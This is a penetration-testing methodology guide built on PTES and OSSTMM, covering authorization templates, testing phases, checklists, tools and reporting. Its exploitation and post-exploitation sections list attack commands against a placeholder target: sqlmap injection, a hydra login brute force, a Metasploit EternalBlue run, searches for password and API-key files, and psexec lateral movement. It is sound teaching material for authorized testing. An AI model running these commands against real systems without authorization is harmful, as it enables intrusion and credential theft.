# Penetration Testing Methodology

## Overview
Systematic approach to penetration testing aligned with industry standards like PTES and OSSTMM.

## Legal and Ethical Considerations

### Pre-Engagement Requirements

**CRITICAL:**
- Obtain written authorization before testing
- Define scope and boundaries
- Establish rules of engagement
- Have incident response plan ready
- Ensure legal compliance

### Authorization Document Template

```
Penetration Testing Authorization Agreement

Project Name: _____________________________
Client Organization: _____________________
Test Period: ____________________________

Scope:
- IP Ranges: _________________________
- Domains: ___________________________
- Applications: _______________________

Out of Scope:
- Production systems (unless authorized)
- Third-party services
- Physical security

Rules of Engagement:
- No data exfiltration
- No destructive testing
- No social engineering
- Follow responsible disclosure

Authorized Tester:
Name: ________________________________
Signature: ___________________________
Date: _______________________________

Client Representative:
Name: ________________________________
Signature: ___________________________
Date: _______________________________
```

## Testing Methodologies

### PTES (Penetration Testing Execution Standard)

#### Phase 1: Pre-Engagement Interactions

**Objectives:**
- Define scope and objectives
- Establish communication channels
- Set expectations and deliverables
- Legal and compliance review

**Deliverables:**
- Rules of Engagement (RoE) document
- Statement of Work (SOW)
- Non-Disclosure Agreement (NDA)

#### Phase 2: Intelligence Gathering

**Passive Reconnaissance:**
```bash
# DNS enumeration
whois target.com
dig target.com ANY
nslookup target.com
host -t ns target.com

# Search engine reconnaissance
google site:target.com filetype:pdf
google site:target.com inurl:admin
google site:target.com ext:sql

# Social media analysis
google site:linkedin.com "target.com" employees
google site:twitter.com target.com
```

**Active Reconnaissance:**
```bash
# Subdomain enumeration
sublist3r -d target.com
amass enum -d target.com
subfinder -d target.com

# Port scanning
nmap -sS -p- -T4 target.com
masscan -p1-65535 target.com --rate=1000

# Technology detection
whatweb target.com
wafw00f target.com
```

**Tools:**
- Nmap, Masscan, Netdiscover
- Sublist3r, Amass, Subfinder
- Whois, Dig, Host
- Google Dorks
- BuiltWith, Wappalyzer

#### Phase 3: Threat Modeling

**Objectives:**
- Identify potential attack vectors
- Understand data flows
- Map application architecture
- Prioritize testing areas

**STRIDE Model:**
- **S**poofing: Can attacker impersonate users?
- **T**ampering: Can attacker modify data?
- **R**epudiation: Can attacker deny actions?
- **I**nformation Disclosure: Can attacker access sensitive data?
- **D**enial of Service: Can attacker disrupt services?
- **E**levation of Privilege: Can attacker gain higher access?

**Deliverables:**
- Threat model document
- Attack tree diagram
- Risk matrix
- Testing prioritization

#### Phase 4: Vulnerability Analysis

**Automated Scanning:**
```bash
# Web vulnerability scan
zap-cli quick-scan --self-contained http://target.com

# Network vulnerability scan
nessuscli scan new --targets target.com --name target_scan

# Container vulnerability scan
trivy image myapp:latest
```

**Manual Testing:**
- Input validation
- Authentication testing
- Session management
- Authorization testing
- Business logic testing

**Tools:**
- OWASP ZAP, Burp Suite
- Nessus, OpenVAS
- Nmap scripts
- Manual testing techniques

#### Phase 5: Exploitation

**Rules:**
- Only exploit to demonstrate risk
- No data exfiltration
- No destructive actions
- Document every step

**Exploitation Techniques:**
```bash
# SQL Injection
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# XSS exploitation
xsser --url http://target.com --auto

# Password brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=failed"

# Metasploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set LHOST local_ip
exploit
```

**Safety Checks:**
- Confirm target ownership
- Test in staging first
- Have rollback plan ready
- Monitor for production impact

#### Phase 6: Post-Exploitation

**Objectives:**
- Demonstrate impact
- Identify data exposure
- Lateral movement (if authorized)
- Persistence (if authorized)

**Activities:**
```bash
# System reconnaissance
whoami
hostname
ipconfig / ifconfig
netstat -ano

# Privilege escalation
linpeas.sh
winpeas.exe
exploit suggester

# Data discovery
find / -name "*password*" -type f 2>/dev/null
grep -r "api_key" /var/www 2>/dev/null

# Lateral movement (authorized only)
net use * \\other-pc\c$
psexec \\other-pc cmd.exe
```

**Tools:**
- LinPEAS, WinPEAS
- Mimikatz (authorized only)
- Empire, Covenant
- BloodHound (AD)

#### Phase 7: Reporting

**Report Structure:**
1. Executive Summary
2. Methodology
3. Detailed Findings
4. Risk Assessment
5. Recommendations
6. Appendices

**Finding Template:**
```
### Finding #X: [Title]

**Severity:** Critical/High/Medium/Low
**CVSS Score:** X.X
**CWE:** CWE-XXX

**Description:**
[Vulnerability description]

**Affected System:**
- URL: [URL]
- File: [File]
- Line: [Line]

**Proof of Concept:**
```bash/code
[Exploitation steps]
```

**Impact:**
- Confidentiality: [Impact]
- Integrity: [Impact]
- Availability: [Impact]

**Remediation:**
[Fix steps]

**References:**
- [OWASP reference]
- [CVE reference]
```

## OSSTMM (Open Source Security Testing Methodology Manual)

### Security Test Modules

#### 1. Human Security
- Social engineering
- Physical security
- Awareness training

#### 2. Physical Security
- Access controls
- Surveillance
- Physical barriers

#### 3. Wireless Security
- WiFi security
- Bluetooth security
- RFID/NFC security

#### 4. Telecommunications Security
- Voice systems
- Network infrastructure
- Mobile devices

#### 5. Data Networks Security
- Firewall configuration
- Network segmentation
- Intrusion detection

#### 6. Data Communications Security
- Encryption protocols
- Certificate management
- Secure protocols

#### 7. Applications Security
- Web applications
- Mobile applications
- API security

## Testing Types

### Black Box Testing

**Definition:** No prior knowledge of the target system

**Advantages:**
- Simulates real-world attack
- Tests all external interfaces
- Unbiased perspective

**Disadvantages:**
- Time-consuming
- May miss internal vulnerabilities
- Requires more reconnaissance

### White Box Testing

**Definition:** Complete knowledge of the target system

**Advantages:**
- More comprehensive coverage
- Faster testing
- Can test internal logic

**Disadvantages:**
- Doesn't simulate real attacker
- May be biased by internal knowledge

### Gray Box Testing

**Definition:** Partial knowledge of the target system

**Advantages:**
- Balanced approach
- More realistic than white box
- More efficient than black box

## Testing Checklist

### Network Security
- [ ] Port scan completed
- [ ] Service enumeration done
- [ ] Banner grabbing performed
- [ ] SSL/TLS configuration checked
- [ ] Firewall rules tested
- [ ] Network segmentation verified

### Web Application Security
- [ ] Information disclosure checked
- [ ] Injection vulnerabilities tested
- [ ] Authentication tested
- [ ] Session management tested
- [ ] Authorization tested
- [ ] CSRF protection tested
- [ ] XSS tested
- [ ] File upload tested
- [ ] Business logic tested
- [ ] API security tested

### System Security
- [ ] Operating system version identified
- [ ] Patch level checked
- [ ] Default credentials tested
- [ ] Misconfigurations identified
- [ ] Privilege escalation tested
- [ ] Service hardening verified

### Data Security
- [ ] Encryption in transit checked
- [ ] Encryption at rest checked
- [ ] Key management reviewed
- [ ] Data retention verified
- [ ] Data classification checked

## Communication Plan

### Daily Updates
- Progress summary
- Critical findings
- Blockers or issues

### Weekly Reports
- Detailed progress
- Updated risk assessment
- Testing status

### Final Deliverables
- Executive summary
- Technical report
- Raw scan data
- Remediation recommendations
- Presentation slides

## Quality Assurance

### Review Checklist
- [ ] All critical findings verified
- [ ] False positives removed
- [ ] Evidence documented
- [ ] Remediation steps tested
- [ ] Report reviewed by senior tester
- [ ] Client review conducted

### Retesting
- Verify remediations
- Confirm no regressions
- Update vulnerability status
- Provide remediation confirmation

## Post-Testing Activities

### Debriefing
- Review findings with client
- Discuss remediation priorities
- Plan remediation timeline
- Schedule retesting

### Knowledge Transfer
- Provide training if needed
- Share best practices
- Recommend tools and processes

### Follow-up
- Check on remediation progress
- Provide support for issues
- Schedule ongoing assessments

## Tools Inventory

### Web Application Testing
| Tool | Purpose | License |
|------|---------|----------|
| OWASP ZAP | Web scanner | Free |
| Burp Suite | Web proxy | Free/Pro |
| SQLMap | SQL injection | Free |
| XSSer | XSS testing | Free |
| Nikto | Web scanner | Free |

### Network Testing
| Tool | Purpose | License |
|------|---------|----------|
| Nmap | Port scanning | Free |
| Metasploit | Exploitation | Free |
| Wireshark | Packet analysis | Free |
| Nessus | Vulnerability scan | Commercial |

### Password Cracking
| Tool | Purpose | License |
|------|---------|----------|
| John the Ripper | Password cracking | Free |
| Hashcat | Password cracking | Free |
| Hydra | Brute force | Free |

### Wireless Testing
| Tool | Purpose | License |
|------|---------|----------|
| Aircrack-ng | WiFi cracking | Free |
| Wifite | WiFi auditing | Free |
| Kismet | WiFi monitoring | Free |

## Reporting Best Practices

### Executive Summary
- High-level overview
- Risk-focused
- Actionable recommendations
- Non-technical language

### Technical Details
- Detailed findings
- Screenshots/evidence
- Step-by-step remediation
- References and resources

### Appendices
- Tool output
- Configuration files
- Network diagrams
- Test scripts

## References

- [PTES Framework](http://www.pentest-standard.org/)
- [OSSTMM Guide](https://www.isecom.org/OSSTMM.3.pdf)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST SP 800-115](https://csrc.nist.gov/publications/detail/sp/800-115/final)
